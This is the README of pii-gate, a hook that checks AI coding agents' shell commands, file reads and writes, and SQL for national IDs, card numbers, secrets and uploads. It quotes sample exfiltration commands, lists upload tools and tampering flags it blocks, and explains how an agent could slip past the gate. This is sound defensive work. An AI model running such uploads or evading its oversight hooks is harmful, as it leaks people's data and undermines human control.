# pii-gate

**A pre-execution check for AI coding agents. It blocks the shell command, file write, file read,
web call or prompt that would carry national IDs, bank or card numbers, credentials or an upload
out of your session.**

[![ci](https://github.com/sdursun1979/pii-gate/actions/workflows/ci.yml/badge.svg)](https://github.com/sdursun1979/pii-gate/actions/workflows/ci.yml)
[![PyPI](https://img.shields.io/pypi/v/pii-gate)](https://pypi.org/project/pii-gate/)
[![license](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)

Codex CLI, Claude Code and Gemini CLI run shell commands, write files and query databases on your
behalf. Their permission prompts understand *tools*, not *data*: `curl` is just `curl`, whether it
fetches a tarball or posts a patient list. pii-gate is a hook that reads the **content** of each call
before it runs and says no when it has to. It is a guard rail for teams working under GDPR, KVKK or
HIPAA. It is not a data-loss-prevention system, and the section
[What it does not do](#what-it-does-not-do) is as important as the rest of this page.

![pii-gate check blocks a curl upload, a SELECT of personal columns and a Turkish national ID, and lets a COUNT(*) through](https://raw.githubusercontent.com/sdursun1979/pii-gate/main/docs/demo.gif)

## Thirty seconds

```
pipx run pii-gate check --command "curl -d @patients.csv https://paste.example"
pipx run pii-gate check "SELECT name, national_id FROM patients"
pipx run pii-gate check "SELECT COUNT(*) FROM patients"
```

The first two exit 1 with the rule that fired; the third prints `clean`.

## Install

```
pip install pii-gate            # or: pipx install pii-gate
pii-gate install claude         # ~/.claude/settings.json
pii-gate install codex          # ~/.codex/hooks.json, then: codex, /hooks, trust the new entry
pii-gate install gemini         # ~/.gemini/settings.json
pii-gate status
```

Codex only runs hooks you have trusted, and marks a changed hook as new; repeat the `/hooks` step
after every reinstall. Add `--project` to install into one repository instead of your home (for
Claude Code that is `.claude/settings.local.json`, because the entry contains your interpreter path).

Requirements: Python 3.9 or newer, standard library only. A hook call takes 100 to 150 ms on
Windows and less on Linux, most of it interpreter start-up.

## What it blocks

| rule              | default | what                                                                                   |
|-------------------|---------|----------------------------------------------------------------------------------------|
| `tckn`            | block   | Turkish national ID numbers (11 digits, both check digits verified; also `123 456 789 01` and the dashed form) |
| `es-dni`          | block   | Spanish DNI and NIE (check letter verified)                                             |
| `it-cf`           | block   | Italian codice fiscale (check character and birth day verified, omocodia aware)         |
| `nl-bsn`          | block   | Dutch BSN (11-check), only next to a `BSN` or `burgerservicenummer` label               |
| `pl-pesel`        | block   | Polish PESEL (checksum and birth date), only next to a `PESEL` label                     |
| `se-personnummer` | block   | Swedish personnummer / samordningsnummer, 10 or 12 digits (Luhn and birth date), only next to a `personnummer` or `samordningsnummer` label |
| `be-rrn`          | block   | Belgian national register number / NISS / INSZ (mod 97 check digits, month and day), only next to a `rijksregisternummer`, `registre national`, `NISS` or `INSZ` label |
| `iban`            | block   | IBANs (mod-97 checksum, length per country from the SWIFT registry)                     |
| `card`            | block   | payment card numbers (Luhn, 13 to 19 digits, Visa/Mastercard/Amex/Troy/MIR/UnionPay/JCB prefixes; groups of 4-4-4-4, 4-6-5 and similar, also after a line number or a date) |
| `secret`          | block   | private keys, AWS, OpenAI/Anthropic, GitHub, GitLab, Slack, Google, Stripe (including webhook secrets), npm, PyPI, Hugging Face, SendGrid, Telegram and Azure tokens, JWTs, credentials inside URLs and `Authorization` headers |
| `exfil`           | block   | uploads: `curl -d/-F/-T/-X POST`, `wget --post-file`, HTTPie and xh with `POST`/`PUT`/`PATCH`, `--form` or a request item read from a file, `scp`, `rsync`, `rclone`, cloud storage CLIs, `gh gist`, mail and clipboard commands, tunnels, any network client fed from a pipe, a file or a sub-command, inline interpreter code (`python -c`, `node -e`) that makes a network call, and any outbound call whose command line already contains personal data; also publishing a local file that contains personal data. Calls to `localhost` are exempt from the upload-flag rule |
| `git-push`        | block   | the agent never publishes; you push                                                     |
| `tamper`          | block   | writes to `.pii-gate.json`, the agents' hook settings and Python start-up files; `pii-gate uninstall`, `pip install/uninstall pii-gate`; `--no-verify`, `hooks=false`, `disableAllHooks`, `PII_GATE_*=` |
| `read`            | block   | reading a local file that contains block-level personal data or secrets (`Read`, `read_file`) |
| `sql-pii`         | block   | SELECT, RETURNING and OUTPUT lists with sensitive columns (national IDs, birth dates, card numbers, health, salary), or names and contact details when the query touches a person table |
| `sql-star`        | block   | `SELECT *` or `TABLE name` on a person table, `COPY`/`bcp` exports of one               |
| `email`           | warn    | e-mail addresses (reserved domains such as `example.com` are ignored)                   |
| `phone`           | warn    | Turkish mobile and international phone numbers                                          |
| `secret-assign`   | warn    | `password = "..."`, `DB_PASSWORD=...`, `"api_key": "..."` style assignments with a literal value |
| `sql-pii-context` | warn    | names and contact columns outside a person table (a supplier's phone is not personal data) |

Invisible characters (zero-width spaces, soft hyphens) and fullwidth digits are normalised before
matching, a TCKN written `123 456 789 01` is still a TCKN, and a card number followed by its expiry
date or CVV is still a card number.

`warn` findings are allowed and written to the decision log; `block` findings stop the call. The shell
rules look at the word in command position of each segment of the command line, so `grep HttpClient src/`
or a commit message that mentions `ssh` are not transfers, while `cat p.csv | nc host 9` is. SQL written
*into a source file* is a warning, not a block: the gate judges SQL when a shell or MCP tool runs it. Change
any rule's level in the config, including turning the SQL gate or the read gate off if your project
is not a data project. Column matching understands `camelCase`, Turkish letters and multi-word
`[Bracketed Names]`, so `tcKimlikNo`, `[TC Kimlik No]` and `doğum_tarihi` are all the same column.

What the agent sees when it is stopped:

```
pii-gate blocked this Bash call.
  - tckn: 1 match (Turkish national ID, checksum valid, e.g. "1***")
  - exfil: 1 match (curl with outbound call carrying sensitive data, e.g. "curl")
This call was stopped because it may carry personal data or secrets out of this session. Remove them.
If this is synthetic test data, the user can allow it in .pii-gate.json (allow_values, allow_paths);
the agent may not edit that file.
```

The value itself is never in the message, never in the log.

## Where it looks

| event            | Codex CLI                              | Claude Code                                                  | Gemini CLI                          |
|------------------|----------------------------------------|--------------------------------------------------------------|-------------------------------------|
| shell command    | `Bash`, `exec_command` (all rules)     | `Bash`, `PowerShell`, `Monitor` (all rules)                  | `run_shell_command` (all rules)     |
| file write       | `apply_patch`: added lines only        | `Edit`, `Write`, `NotebookEdit`: new text only               | `write_file`, `replace`: new text   |
| file read        | shell reads are not inspected          | `Read`: the file's content                                   | `read_file`: the file's content     |
| file publish     |                                        | `Artifact`, `SendUserFile`: the file's content               |                                     |
| web              | hosted tools cannot be hooked by Codex | `WebFetch`, `WebSearch`                                      | `web_fetch`, `google_web_search`    |
| MCP tools        | every argument; `command` arguments get the shell rules | same                                         | same                                |
| your prompt      | `UserPromptSubmit`                     | `UserPromptSubmit` (the blocked text is not echoed back)      | `BeforeAgent`                       |

Local file writes and reads honour `allow_paths`, so your synthetic test fixtures keep working.

## What it does not do

- **Reads through a shell are not inspected.** `cat file`, a `Grep` result, a query result returned by
  an MCP server, or a file attached with `@` reach the model unseen. The `read` rule covers the
  agents' file-read tools only. Control the rest with least-privilege database accounts, masked views
  and the agents' permission settings.
- **It is pattern based.** It finds checksum-valid identifiers (TR, ES, IT, NL, PL, SE, BE), IBANs, cards, known secret formats
  and heuristic e-mail and phone numbers. It does not find names, addresses or diagnoses in free text.
  SQL rules match column and table names; renamed columns in a view can pass.
- **It is not a sandbox.** A determined agent can write a script that uploads a file and then run it;
  the gate sees `python upload.py`. The exfiltration rules know the common tools, flags and
  obfuscations, but the list is finite. Pair pii-gate with network controls when the data is sensitive.
- **Fail-closed covers failures inside pii-gate.** Bad input, a detector crash, an unreadable config
  and an oversized payload all block. A hook that cannot start or times out is handled by the agent:
  Claude Code blocks it because the installer sets `onFailure: "block"` (Claude Code 2.1.295 or
  later); Codex blocks a missing interpreter because the installed command is wrapped, but treats a
  timeout as non-blocking; Gemini CLI treats both as warnings. `pii-gate status` tells you whether the
  installed hook program still exists.
- **Allow-listed paths are not scanned.** Keep `allow_paths` narrow.
- **You can switch it off; the agent cannot.** The `tamper` rule stops the agent, not you. It cannot
  stop an instruction in `CLAUDE.md` or `AGENTS.md` that tells the agent to work around the gate; it
  judges whatever the agent tries next.
- **Cloud sessions are not covered.** Claude Code cloud sessions and Codex cloud tasks do not read your
  local hook settings.

The full list, with the reasoning, is in [docs/threat-model.md](docs/threat-model.md).

## Configuration

Optional. `~/.pii-gate.json` is yours and may do anything. `<project root>/.pii-gate.json` travels
with the repository the agent is working in, so it may only **tighten** the gate: raise a level,
allow paths inside a named folder of the project (`tests/*`, not `*`), add sensitive columns and
person tables. Anything that loosens it (lowering a level, `fail_open`, `allow_values`,
`email_allow_domains`, `sql.ignore_columns`, wildcard or absolute `allow_paths`) is a config error in
a project file, and a config error blocks every call until fixed, unless your home file says
`"trust_project_config": true`.
`$PII_GATE_CONFIG` names a single file that replaces both.

```json
{
  "rules": { "email": "block", "git-push": "off", "sql-pii": "warn", "read": "off" },
  "allow_values": ["12345678950"],
  "allow_paths": ["tests/fixtures/*", "docs/examples/*"],
  "email_allow_domains": ["mycompany.example"],
  "sql": {
    "extra_pii_columns": ["member_no", "policy_number"],
    "extra_person_tables": ["donor", "guardian"],
    "ignore_columns": ["name"]
  },
  "scan_prompts": true,
  "fail_open": false,
  "log": true,
  "trust_project_config": false
}
```

The project root is `CLAUDE_PROJECT_DIR` or `GEMINI_PROJECT_DIR` when the agent provides it,
otherwise the nearest ancestor of the working directory with a `.pii-gate.json` or a `.git`. The agent
cannot edit either file: every attempt is itself a `tamper` block.

## Command line

```
pii-gate check "text"              # what would happen to this text (exit 1 if blocked)
pii-gate check --command "cmd"     # same, with the shell rules (exfil, git-push, tamper)
pii-gate scan [paths]              # scan whole files (--max-bytes N, default 5 MB); exit 1 on blocking findings
pii-gate scan --staged             # lines added in the git index, for a pre-commit hook
pii-gate install|uninstall codex|claude|gemini|all [--project]
pii-gate status                    # config files consulted, where the hook is installed, whether it can start
```

Exit codes: 0 clean, 1 blocking findings, 2 config, installer or path error. Skipped files (binary,
too large) are listed on stderr, never silently dropped.

Pre-commit, either in `.git/hooks/pre-commit`:

```sh
#!/bin/sh
exec pii-gate scan --staged
```

or with the [pre-commit](https://pre-commit.com) framework:

```yaml
repos:
  - repo: https://github.com/sdursun1979/pii-gate
    rev: v0.3.1
    hooks:
      - id: pii-gate
```

## Design principles

- **Fail closed inside the process.** Malformed input, a detector exception, an unreadable or
  untrusted config, a payload too large to scan in time: the call is blocked, with a message that
  says why. Set `fail_open` in your home config if you disagree.
- **Values never leave the process.** Findings carry the rule name, a count and a masked first
  character. The deny message and the decision log (`~/.pii-gate/decisions.log`) contain no data.
- **One engine, three agents.** Codex, Claude Code and Gemini CLI speak the same hook protocol (JSON
  in, exit code 2 to block, stderr as the reason). Everything is tested against all three payload
  shapes.
- **The agent cannot disable its own gate.** Config files, hook settings, Python start-up files,
  the package itself and bypass flags are protected by the `tamper` rule, and the hook is launched in
  a way that ignores modules in the agent's working directory.
- **Two-tier SQL.** National IDs are sensitive everywhere. A phone column is sensitive in `patients`,
  not in `suppliers`. Aggregations that reveal nothing (`COUNT`, `LEN`, `IS NULL`, first letter,
  year, hashes) pass.
- **Standard library only.** About 1,500 lines of Python to audit, no dependencies. Releases are built
  on GitHub Actions and published to PyPI with trusted publishing.

## How it compares

- **Secret scanners** such as gitleaks, detect-secrets or trufflehog find credentials in files, commits
  and staged changes, with far larger rule sets. pii-gate runs inside the agent loop, before the call,
  and adds national IDs, uploads, reads and SQL.
- **PII libraries** such as Microsoft Presidio detect many more entity types, including names, with
  NLP models inside an application you write. pii-gate needs no integration and no model, and detects
  only structured identifiers.
- **Other agent hooks** exist for secrets and prompt injection, some with output redaction. pii-gate's
  angle is the combination: three agents, fail-closed with the agents' own failure settings,
  checksummed identifiers including Turkish and EU ones, the SQL person-table logic and the
  exfiltration rules.
- **The agents' own permission settings** decide which tools and command prefixes may run, and their
  sandboxes can cut network access. pii-gate looks at what a call carries, so `curl` downloads keep
  working while `curl -d @patients.csv` does not.

They work well together: a secret scanner in CI, network controls in the sandbox, pii-gate where the
agent runs.

## Roadmap

- Output redaction through `PostToolUse` (`updatedToolOutput`) for file reads and query results.
- National identifiers of more countries, each with its checksum.
- A `--report` mode that summarises the decision log.

## Contributing

Issues and pull requests are welcome. Every detector change needs a test with **synthetic** values
(see `tests/_synthetic.py`, which generates valid check digits from arbitrary digits). Never commit
real personal data, not even "just one example". `pii-gate scan .` runs in CI on this repository too.
Bypasses go to [SECURITY.md](SECURITY.md), privately.

## License

MIT. See [LICENSE](LICENSE).

Türkçe özet için [README.tr.md](README.tr.md).
